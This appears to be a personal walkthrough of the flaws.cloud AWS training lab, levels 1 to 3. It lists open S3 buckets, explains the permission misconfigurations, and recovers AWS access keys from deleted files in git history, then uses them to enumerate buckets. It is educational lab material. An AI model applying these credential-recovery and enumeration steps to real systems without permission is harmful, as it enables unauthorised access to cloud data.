
## LEVEL 1

### Identifying that the website is a bucket & its AZ

![[Pasted image 20211026194815.png]]

![[Pasted image 20211026194835.png]]


### Enumerating items from the bucket

![[Pasted image 20211026194909.png]]

### Why the issue is present

**The permissions of reading from the bucket is set to everyone**

![[Pasted image 20211026214800.png]]

## LEVEL 2

### Enumerating items from bucket using an AWS Account *Any authenticated user*

First we have to configure our profile with our AWS credentials.

```bash
aws configure --profile chan
```


```bash
aws s3 --profile chan ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 21:02:15      80751 everyone.png
2017-03-02 22:47:17       1433 hint1.html
2017-02-26 21:04:39       1035 hint2.html
2017-02-26 21:02:14       2786 index.html
2017-02-26 21:02:14         26 robots.txt
2017-02-26 21:02:15       1051 secret-e4443fc.html
```

### Why the issue is present

**The permissions of reading from the bucket is set to Any authenticated user on AWS**

![[Pasted image 20211026215339.png]]

## Level 3

### Recovering AWS Keys from git log

![[Pasted image 20211026220107.png]]

**Retrieving all the commits which have deleted files**

```bash
git log --diff-filter=D --summary 
```

![[Pasted image 20211026220305.png]]

```bash
git checkout $commitsha~1 access_keys.txt
```

![[Pasted image 20211026220406.png]]


**Configuring new profile**

```bash
aws configure --profile chan
```

### Enumerating buckets from the new account

```bash
 aws s3 ls --profile flaw
2020-06-25 12:43:56 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2020-06-26 18:06:07 config-bucket-975426262029
2020-06-27 05:46:15 flaws-logs
2020-06-27 05:46:15 flaws.cloud
2020-06-27 10:27:14 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2020-06-27 10:27:14 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2020-06-27 10:27:14 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2020-06-27 10:27:15 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2020-06-27 10:27:15 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2020-06-27 21:29:47 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud

```